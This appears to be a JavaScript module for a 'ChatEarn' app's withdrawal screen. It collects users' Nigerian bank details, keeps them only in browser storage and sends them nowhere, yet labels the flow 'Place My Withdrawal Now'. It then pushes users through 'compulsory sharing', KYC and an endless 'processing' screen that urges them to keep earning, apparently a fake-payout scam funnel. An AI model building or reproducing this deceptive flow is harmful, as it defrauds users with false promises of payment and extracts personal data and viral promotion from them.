/* ChatEarn V8E.10 — frontend-only withdrawal handoff. */
(() => {
  'use strict';
  if (window.__CHAT_EARN_V8E10_DIRECT_WITHDRAWAL__) return;
  window.__CHAT_EARN_V8E10_DIRECT_WITHDRAWAL__ = true;

  const VERSION='8E.10';
  const DRAFT_KEY='ce_withdrawal_draft_v8e';
  const FLOW_KEY='ce_withdrawal_flow_v8e';
  const REQUEST_KEY='ce_withdrawal_request_local_v1';
  const byId=id=>document.getElementById(id);
  const loadJSON=(key,fallback=null)=>{try{return JSON.parse(localStorage.getItem(key)||'null')??fallback}catch(_){return fallback}};
  const saveJSON=(key,value)=>localStorage.setItem(key,JSON.stringify(value));

  const BANKS=[['opay','OPay'],['palmpay','PalmPay'],['kuda','Kuda Bank'],['moniepoint','Moniepoint'],['gtbank','GTBank'],['access','Access Bank'],['firstbank','First Bank'],['uba','UBA'],['zenith','Zenith Bank'],['fcmb','FCMB'],['fidelity','Fidelity Bank'],['sterling','Sterling Bank'],['wema','Wema Bank / ALAT'],['union','Union Bank'],['stanbic','Stanbic IBTC'],['ecobank','Ecobank'],['polaris','Polaris Bank'],['keystone','Keystone Bank'],['providus','Providus Bank'],['other','Other Nigerian bank']];

  function visibleAmount(){
    try{if(Number(totalBalance)>0)return Number(totalBalance)}catch(_){}
    const text=document.querySelector('#withdraw .wd-amount-display,#withdraw .amount-display,#withdraw .wd-amount')?.textContent||'';
    return Number(text.replace(/[^0-9]/g,''))||0;
  }

  function cleanOldUi(){
    byId('cePayoutAccountForm')?.remove();
    document.querySelectorAll('#withdraw .form-group,#withdraw .btn-place-wd,#withdraw .admin-status-banner').forEach(el=>{if(!el.closest('#ceDirectWithdrawalForm'))el.style.display='none'});
    const portal=byId('withdrawalPortalStatus');if(portal)portal.style.display='none';
  }

  function updateJourneyCopy(amount,bank){
    const formatted='₦'+Number(amount||0).toLocaleString('en-NG');
    document.querySelectorAll('#sharewall strong,#kyc strong').forEach(el=>{if(/₦[\d,]+/.test(el.textContent||''))el.textContent=formatted});
    const ppAmount=byId('ppAmount');if(ppAmount)ppAmount.textContent=formatted;
    const ppBank=byId('ppBank');if(ppBank)ppBank.textContent=bank;
  }

  function routeLocalRequest(request){
    saveJSON(FLOW_KEY,{withdrawal_id:request.id,stage:'sharing_required',updated_at:Date.now(),local:true});
    updateJourneyCopy(request.amount,request.bank_label);
    window.goScreen?.('sharewall');
  }

  function recoverLocal(){
    const request=loadJSON(REQUEST_KEY,null);
    const flow=loadJSON(FLOW_KEY,null);
    if(!request||!flow?.stage)return false;
    updateJourneyCopy(request.amount,request.bank_label);
    if(flow.stage==='sharing_required')window.goScreen?.('sharewall');
    else if(flow.stage==='kyc_required')window.goScreen?.('kyc');
    else if(flow.stage==='processing')window.goScreen?.('processing');
    return true;
  }

  function ensureDirectForm(){
    const body=document.querySelector('#withdraw .wd-body');if(!body)return;
    cleanOldUi();if(byId('ceDirectWithdrawalForm'))return;
    const d=loadJSON(DRAFT_KEY,{})||{};
    const f=document.createElement('form');
    f.id='ceDirectWithdrawalForm';f.className='ce-direct-withdrawal-form';f.style.cssText='margin:18px 0 0;display:grid;gap:14px';
    f.innerHTML=`<div class="form-group" style="display:block"><label class="form-label">Select Bank</label><select id="ceDirectBank" class="form-input" required>${BANKS.map(([v,l])=>`<option value="${v}">${l}</option>`).join('')}</select></div><div class="form-group" style="display:block"><label class="form-label">Account Name</label><input id="ceDirectAccountName" class="form-input" required maxlength="120" autocomplete="name" placeholder="Enter the name on the bank account"></div><div class="form-group" style="display:block"><label class="form-label">Account Number</label><input id="ceDirectAccountNumber" class="form-input" required inputmode="numeric" maxlength="10" autocomplete="off" placeholder="Enter 10-digit account number"></div><div style="background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:10px;padding:12px 14px;font-size:12px;color:#69F0AE;line-height:1.55">🔒 Your withdrawal details are saved on this device for the current flow.</div><button type="submit" class="btn-place-wd" style="display:block!important">Place My Withdrawal Now →</button><div id="ceDirectWithdrawalStatus" style="font-size:12px;color:var(--text);text-align:center;min-height:18px">Next: compulsory sharing, KYC, then payment processing.</div>`;
    body.appendChild(f);
    const bank=byId('ceDirectBank'),name=byId('ceDirectAccountName'),number=byId('ceDirectAccountNumber');
    bank.value=d.bank||'opay';name.value=d.account_name||'';number.value=d.account_number||'';
    const persist=()=>saveJSON(DRAFT_KEY,{bank:bank.value,account_name:name.value.trim(),account_number:number.value.replace(/\D/g,'').slice(0,10)});
    bank.onchange=persist;name.oninput=persist;number.oninput=()=>{number.value=number.value.replace(/\D/g,'').slice(0,10);persist()};
    f.onsubmit=e=>{
      e.preventDefault();
      const status=byId('ceDirectWithdrawalStatus');
      const accountName=name.value.trim(),accountNumber=number.value.replace(/\D/g,'').slice(0,10);
      if(accountName.length<3||!/[a-zA-Z]/.test(accountName)){status.textContent='Enter the correct account name.';name.focus();return}
      if(accountNumber.length!==10){status.textContent='Enter a valid 10-digit account number.';number.focus();return}
      const amount=visibleAmount();
      if(amount<40000){status.textContent='Your withdrawal amount is not ready yet.';return}
      persist();
      const request={id:`local-${crypto.randomUUID()}`,amount,bank:bank.value,bank_label:bank.options[bank.selectedIndex]?.text||bank.value,account_name:accountName,account_number:accountNumber,status:'sharing_required',created_at:new Date().toISOString(),local:true};
      saveJSON(REQUEST_KEY,request);
      status.textContent='Withdrawal request started. Opening sharing verification…';
      routeLocalRequest(request);
    };
  }

  function showContinue(){
    const p=byId('processing');if(!p||byId('ceContinueEarningBtn'))return;
    const w=document.createElement('div');w.style.cssText='margin-top:18px;text-align:center;max-width:430px;padding:0 20px';
    w.innerHTML='<div style="margin-bottom:12px">Your payment is processing. You can continue earning.</div><button id="ceContinueEarningBtn" class="btn-place-wd" style="display:block!important">Continue Earning →</button>';
    p.appendChild(w);
    byId('ceContinueEarningBtn').onclick=()=>{localStorage.setItem('ce_returning_user','1');const flow=loadJSON(FLOW_KEY,{})||{};saveJSON(FLOW_KEY,{...flow,stage:'processing',updated_at:Date.now(),local:true});window.ChatEarnV8DFlow?.openNextConversation?.()||window.goScreen?.('dashboard')};
  }

  const original=window.goScreen;
  if(typeof original==='function')window.goScreen=function(id){const r=original(id);if(id==='withdraw')setTimeout(ensureDirectForm,80);if(id==='processing')setTimeout(showContinue,60);return r};
  function boot(){let s='';try{s=currentScreen||''}catch(_){}if(s==='withdraw')ensureDirectForm();if(s==='processing')showContinue()}
  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',boot,{once:true});else boot();
  window.addEventListener('pageshow',()=>setTimeout(boot,120));
  window.ChatEarnV8EDirectWithdrawal=Object.freeze({version:VERSION,ensureDirectForm,recoverLocal,diagnostic:()=>({version:VERSION,frontendOnly:true,flow:loadJSON(FLOW_KEY,null)})});
})();